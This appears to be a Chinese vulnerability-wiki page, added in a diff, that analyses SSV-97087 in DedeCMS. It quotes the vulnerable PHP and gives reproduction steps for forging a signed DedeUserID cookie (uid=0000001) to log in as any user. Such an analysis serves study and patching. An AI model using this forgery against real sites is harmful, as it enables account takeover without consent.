@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Dedecms/%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88SSV-97087%EF%BC%89DeDecms%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>（SSV-97087）DeDecms 任意用户登录 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\uff08SSV-97087\uff09DeDecms \u4efb\u610f\u7528\u6237\u767b\u5f55", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%EF%BC%88CNVD-2018-01221%EF%BC%89DedeCMS%20V5.7%20SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%EF%BC%88CNVD-2018-01221%EF%BC%89DedeCMS%20V5.7%20SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88SSV-97074%EF%BC%89DeDecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88SSV-97074%EF%BC%89DeDecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/" class="btn btn-xs btn-link">
+        （SSV-97074）DeDecms 前台任意用户密码修改
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="ssv-97087dedecms">（SSV-97087）DeDecms 任意用户登录<a class="headerlink" href="#ssv-97087dedecms" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>漏洞编号：SSV-97087，提交时间：20180118</p>
+<p>dedecms的会员模块的身份认证使用的是客户端session，在Cookie中写入用户ID并且附上ID__ckMd5，用做签名。主页存在逻辑漏洞，导致可以返回指定uid的ID的Md5散列值。原理上可以伪造任意用户登录。</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">代码分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>在/member/index.php中会接收uid和action参数。uid为用户名，进入index.php后会验证Cookie中的用户ID与uid(用户名)并确定用户权限。</p>
+<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">action</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+<span class="w">   </span><span class="p">{</span>
+<span class="w">       </span><span class="n">include_once</span><span class="p">(</span><span class="n">DEDEINC</span><span class="o">.</span><span class="s2">&quot;/channelunit.func.php&quot;</span><span class="p">);</span>
+<span class="w">       </span><span class="o">$</span><span class="n">dpl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">DedeTemplate</span><span class="p">();</span>
+<span class="w">       </span><span class="o">$</span><span class="n">tplfile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DEDEMEMBER</span><span class="o">.</span><span class="s2">&quot;/space/{$_vars[&#39;spacestyle&#39;]}/index.htm&quot;</span><span class="p">;</span>
+
+<span class="w">       </span><span class="o">//</span><span class="err">更新最近访客记录及站点统计记录</span>
+<span class="w">       </span><span class="o">$</span><span class="n">vtime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">time</span><span class="p">();</span>
+<span class="w">       </span><span class="o">$</span><span class="n">last_vtime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetCookie</span><span class="p">(</span><span class="s1">&#39;last_vtime&#39;</span><span class="p">);</span>
+<span class="w">       </span><span class="o">$</span><span class="n">last_vid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetCookie</span><span class="p">(</span><span class="s1">&#39;last_vid&#39;</span><span class="p">);</span>
+<span class="w">       </span><span class="k">if</span><span class="p">(</span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="n">last_vtime</span><span class="p">))</span>
+<span class="w">       </span><span class="p">{</span>
+<span class="w">           </span><span class="o">$</span><span class="n">last_vtime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">       </span><span class="p">}</span>
+<span class="w">       </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">vtime</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">$</span><span class="n">last_vtime</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">3600</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="n">preg_match</span><span class="p">(</span><span class="s1">&#39;#,&#39;</span><span class="o">.$</span><span class="n">uid</span><span class="o">.</span><span class="s1">&#39;,#i&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;,&#39;</span><span class="o">.$</span><span class="n">last_vid</span><span class="o">.</span><span class="s1">&#39;,&#39;</span><span class="p">))</span>
+<span class="w">       </span><span class="p">{</span>
+<span class="w">           </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">last_vid</span><span class="o">!=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+<span class="w">           </span><span class="p">{</span>
+<span class="w">               </span><span class="o">$</span><span class="n">last_vids</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="o">$</span><span class="n">last_vid</span><span class="p">);</span>
+<span class="w">               </span><span class="o">$</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">               </span><span class="o">$</span><span class="n">last_vid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">uid</span><span class="p">;</span>
+<span class="w">               </span><span class="n">foreach</span><span class="p">(</span><span class="o">$</span><span class="n">last_vids</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">$</span><span class="n">lsid</span><span class="p">)</span>
+<span class="w">               </span><span class="p">{</span>
+<span class="w">                   </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">i</span><span class="o">&gt;</span><span class="mi">10</span><span class="p">)</span>
+<span class="w">                   </span><span class="p">{</span>
+<span class="w">                       </span><span class="k">break</span><span class="p">;</span>
+<span class="w">                   </span><span class="p">}</span>
+<span class="w">                   </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">lsid</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">$</span><span class="n">uid</span><span class="p">)</span>
+<span class="w">                   </span><span class="p">{</span>
+<span class="w">                       </span><span class="o">$</span><span class="n">i</span><span class="o">++</span><span class="p">;</span>
+<span class="w">                       </span><span class="o">$</span><span class="n">last_vid</span><span class="w"> </span><span class="o">.=</span><span class="w"> </span><span class="s1">&#39;,&#39;</span><span class="o">.$</span><span class="n">last_vid</span><span class="p">;</span>
+<span class="w">                   </span><span class="p">}</span>
+<span class="w">               </span><span class="p">}</span>
+<span class="w">           </span><span class="p">}</span>
+<span class="w">           </span><span class="k">else</span>
+<span class="w">           </span><span class="p">{</span>
+<span class="w">               </span><span class="o">$</span><span class="n">last_vid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">uid</span><span class="p">;</span>
+<span class="w">           </span><span class="p">}</span>
+<span class="w">           </span><span class="n">PutCookie</span><span class="p">(</span><span class="s1">&#39;last_vtime&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">vtime</span><span class="p">,</span><span class="w"> </span><span class="mi">3600</span><span class="o">*</span><span class="mi">24</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+<span class="w">           </span><span class="n">PutCookie</span><span class="p">(</span><span class="s1">&#39;last_vid&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">last_vid</span><span class="p">,</span><span class="w"> </span><span class="mi">3600</span><span class="o">*</span><span class="mi">24</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</code></pre></div>
+
+<p>我们可以看到当uid存在值时就会进入我们现在的代码中，当cookie中的last_vid中不存在值为空时，就会将uid值赋予过去，$last_vid
+= $uid;，然后PutCookie。</p>
+<p>那么这么说，我们控制了$uid就相当于可以返回任意值经过服务器处理的md5值。</p>
+<p>而在接下来会验证用户是否登录。</p>
+<p>现在我们来看看，dedecms会员认证系统是怎么实现的：/include/memberlogin.class.php</p>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span><span class="n">php5构造函数</span>
+<span class="k">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(</span><span class="n">$kptime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">$cache</span><span class="o">=</span><span class="no">FALSE</span><span class="p">)</span>
+<span class="err">{</span>
+<span class="w">    </span><span class="k">global</span><span class="w"> </span><span class="n">$dsql</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">$kptime</span><span class="o">==-</span><span class="mi">1</span><span class="p">)</span><span class="err">{</span>
+<span class="w">        </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_KeepTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3600</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">7</span><span class="p">;</span>
+<span class="w">    </span><span class="err">}</span><span class="k">else</span><span class="err">{</span>
+<span class="w">        </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_KeepTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$kptime</span><span class="p">;</span>
+<span class="w">    </span><span class="err">}</span>
+<span class="w">    </span><span class="n">$formcache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="no">FALSE</span><span class="p">;</span>
+<span class="w">    </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_ID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">GetNum</span><span class="p">(</span><span class="n">GetCookie</span><span class="p">(</span><span class="s2">&quot;DedeUserID&quot;</span><span class="p">));</span>
+<span class="w">    </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_LoginTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetCookie</span><span class="p">(</span><span class="s2">&quot;DedeLoginTime&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">array</span><span class="p">();</span>
+<span class="w">    </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">isAdmin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="no">FALSE</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_ID</span><span class="p">))</span>
+<span class="w">    </span><span class="err">{</span>
+<span class="w">        </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">ResetUser</span><span class="p">();</span>
+<span class="w">    </span><span class="err">}</span><span class="k">else</span><span class="err">{</span>
+<span class="w">        </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_ID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">intval</span><span class="p">(</span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_ID</span><span class="p">);</span>
+
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">$cache</span><span class="p">)</span>
+<span class="w">        </span><span class="err">{</span>
+<span class="w">            </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetCache</span><span class="p">(</span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">memberCache</span><span class="p">,</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_ID</span><span class="p">);</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="w"> </span><span class="k">empty</span><span class="p">(</span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>
+<span class="w">            </span><span class="err">{</span>
+<span class="w">                </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$dsql</span><span class="o">-&gt;</span><span class="n">GetOne</span><span class="p">(</span><span class="s2">&quot;Select * From `#@__member` where mid=&#39;{$this-&gt;M_ID}&#39; &quot;</span><span class="p">);</span>
+<span class="w">            </span><span class="err">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="err">{</span>
+<span class="w">                </span><span class="n">$formcache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="no">TRUE</span><span class="p">;</span>
+<span class="w">            </span><span class="err">}</span>
+<span class="w">        </span><span class="err">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="err">{</span>
+<span class="w">            </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$dsql</span><span class="o">-&gt;</span><span class="n">GetOne</span><span class="p">(</span><span class="s2">&quot;Select * From `#@__member` where mid=&#39;{$this-&gt;M_ID}&#39; &quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="err">}</span>
+
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">is_array</span><span class="p">(</span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="p">))</span><span class="err">{</span>
+<span class="w">            </span><span class="c1">#api{{</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">defined</span><span class="p">(</span><span class="s1">&#39;UC_API&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nv">@include_once</span><span class="w"> </span><span class="n">DEDEROOT</span><span class="p">.</span><span class="s1">&#39;/uc_client/client.php&#39;</span><span class="p">)</span>
+<span class="w">            </span><span class="err">{</span>
+<span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="n">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">uc_get_user</span><span class="p">(</span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;userid&#39;</span><span class="err">]</span><span class="p">))</span>
+<span class="w">                </span><span class="err">{</span>
+<span class="w">                    </span><span class="k">if</span><span class="p">(</span><span class="n">uc_check_avatar</span><span class="p">(</span><span class="n">$data</span><span class="err">[</span><span class="mi">0</span><span class="err">]</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">strstr</span><span class="p">(</span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;face&#39;</span><span class="err">]</span><span class="p">,</span><span class="n">UC_API</span><span class="p">))</span>
+<span class="w">                    </span><span class="err">{</span>
+<span class="w">                        </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;face&#39;</span><span class="err">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UC_API</span><span class="p">.</span><span class="s1">&#39;/avatar.php?uid=&#39;</span><span class="p">.</span><span class="n">$data</span><span class="err">[</span><span class="mi">0</span><span class="err">]</span><span class="p">.</span><span class="s1">&#39;&amp;size=middle&#39;</span><span class="p">;</span>
+<span class="w">                        </span><span class="n">$dsql</span><span class="o">-&gt;</span><span class="n">ExecuteNoneQuery</span><span class="p">(</span><span class="s2">&quot;UPDATE `#@__member` SET `face`=&#39;&quot;</span><span class="p">.</span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;face&#39;</span><span class="err">]</span><span class="p">.</span><span class="s2">&quot;&#39; WHERE `mid`=&#39;{$this-&gt;M_ID}&#39;&quot;</span><span class="p">);</span>
+<span class="w">                    </span><span class="err">}</span>
+<span class="w">                </span><span class="err">}</span>
+<span class="w">            </span><span class="err">}</span>
+<span class="w">            </span><span class="c1">#/aip}}</span>
+
+<span class="w">            </span><span class="o">//</span><span class="n">间隔一小时更新一次用户登录时间</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="kt">time</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_LoginTime</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">3600</span><span class="p">)</span>
+<span class="w">            </span><span class="err">{</span>
+<span class="w">                </span><span class="n">$dsql</span><span class="o">-&gt;</span><span class="n">ExecuteNoneQuery</span><span class="p">(</span><span class="s2">&quot;update `#@__member` set logintime=&#39;&quot;</span><span class="p">.</span><span class="kt">time</span><span class="p">().</span><span class="s2">&quot;&#39;,loginip=&#39;&quot;</span><span class="p">.</span><span class="n">GetIP</span><span class="p">().</span><span class="s2">&quot;&#39; where mid=&#39;&quot;</span><span class="p">.</span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;mid&#39;</span><span class="err">]</span><span class="p">.</span><span class="s2">&quot;&#39;;&quot;</span><span class="p">);</span>
+<span class="w">                </span><span class="n">PutCookie</span><span class="p">(</span><span class="s2">&quot;DedeLoginTime&quot;</span><span class="p">,</span><span class="kt">time</span><span class="p">(),</span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_KeepTime</span><span class="p">);</span>
+<span class="w">            </span><span class="err">}</span>
+<span class="w">            </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_LoginID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;userid&#39;</span><span class="err">]</span><span class="p">;</span>
+<span class="w">            </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_MbType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;mtype&#39;</span><span class="err">]</span><span class="p">;</span>
+<span class="w">            </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_Money</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;money&#39;</span><span class="err">]</span><span class="p">;</span>
+<span class="w">            </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_UserName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FormatUsername</span><span class="p">(</span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;uname&#39;</span><span class="err">]</span><span class="p">);</span>
+<span class="w">            </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_Scores</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;scores&#39;</span><span class="err">]</span><span class="p">;</span>
+<span class="w">            </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_Face</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;face&#39;</span><span class="err">]</span><span class="p">;</span>
+<span class="w">            </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_Rank</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;rank&#39;</span><span class="err">]</span><span class="p">;</span>
+<span class="w">            </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_Spacesta</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;spacesta&#39;</span><span class="err">]</span><span class="p">;</span>
+<span class="w">            </span><span class="n">$sql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Select titles From #@__scores where integral&lt;={$this-&gt;fields[&#39;scores&#39;]} order by integral desc&quot;</span><span class="p">;</span>
+<span class="w">            </span><span class="n">$scrow</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$dsql</span><span class="o">-&gt;</span><span class="n">GetOne</span><span class="p">(</span><span class="n">$sql</span><span class="p">);</span>
+<span class="w">            </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;honor&#39;</span><span class="err">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$scrow</span><span class="err">[</span><span class="s1">&#39;titles&#39;</span><span class="err">]</span><span class="p">;</span>
+<span class="w">            </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_Honor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;honor&#39;</span><span class="err">]</span><span class="p">;</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;matt&#39;</span><span class="err">]</span><span class="o">==</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">isAdmin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="no">TRUE</span><span class="p">;</span>
+<span class="w">            </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_UpTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;uptime&#39;</span><span class="err">]</span><span class="p">;</span>
+<span class="w">            </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_ExpTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;exptime&#39;</span><span class="err">]</span><span class="p">;</span>
+<span class="w">            </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_JoinTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MyDate</span><span class="p">(</span><span class="s1">&#39;Y-m-d&#39;</span><span class="p">,</span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="err">[</span><span class="s1">&#39;jointime&#39;</span><span class="err">]</span><span class="p">);</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_Rank</span><span class="o">&gt;</span><span class="mi">10</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_UpTime</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="err">{</span>
+<span class="w">                </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_HasDay</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">Judgemember</span><span class="p">();</span>
+<span class="w">            </span><span class="err">}</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">$formcache</span><span class="w"> </span><span class="p">)</span>
+<span class="w">            </span><span class="err">{</span>
+<span class="w">                </span><span class="k">Set</span><span class="n">Cache</span><span class="p">(</span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">memberCache</span><span class="p">,</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">M_ID</span><span class="p">,</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="k">fields</span><span class="p">,</span><span class="w"> </span><span class="mi">1800</span><span class="p">);</span>
+<span class="w">            </span><span class="err">}</span>
+<span class="w">        </span><span class="err">}</span><span class="k">else</span><span class="err">{</span>
+<span class="w">            </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">ResetUser</span><span class="p">();</span>
+<span class="w">        </span><span class="err">}</span>
+<span class="w">    </span><span class="err">}</span>
+<span class="err">}</span>
+</code></pre></div>
+
+<p>$this-&gt;M_ID等于Cookie中的DedUserID，我们继续看看GetCookie函数</p>
+<div class="codehilite"><pre><span></span><code>if ( ! function_exists(&#39;GetCookie&#39;))
+{
+    function GetCookie($key)
+    {
+        global $cfg_cookie_encode;
+        if( !isset($_COOKIE[$key]) || !isset($_COOKIE[$key.&#39;__ckMd5&#39;]) )
+        {
+            return &#39;&#39;;
+        }
+        else
+        {
+            if($_COOKIE[$key.&#39;__ckMd5&#39;]!=substr(md5($cfg_cookie_encode.$_COOKIE[$key]),0,16))
+            {
+                return &#39;&#39;;
+            }
+            else
+            {
+                return $_COOKIE[$key];
+            }
+        }
+    }
+}
+</code></pre></div>
+
+<p>它不但读了cookie还验证了md5值。</p>
+<p>这样，由于index.php中我们可以控制返回一个输入值和这个输入值经过服务器处理后的md5值。那么如果我们伪造DedUserID和它对应的MD5就行了。</p>
+<p>最后一个问题，因为我们上面是通过用户名伪造ID的，用户名为字符串而ID为整数，但好在在构造用户类中将M_ID
+intval了一下$this-&gt;M_ID = intval($this-&gt;M_ID);
+那么这么说，如果我们想伪造ID为1的用户的Md5，我们只要在上面设置uid(用户名)为'000001'即可。</p>
+<h3 id="_5">复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<h4 id="1memberindexphpdedeuseridmd5">1、先从member/index.php中获取伪造的DedeUserID和它对于的md5<a class="headerlink" href="#1memberindexphpdedeuseridmd5" title="Permanent link">&para;</a></h4>
+<h4 id="2">2、使用它登录<a class="headerlink" href="#2" title="Permanent link">&para;</a></h4>
+<p>访问member/index.php?uid=0000001并抓包(注意cookie中last_vid值应该为空)。</p>
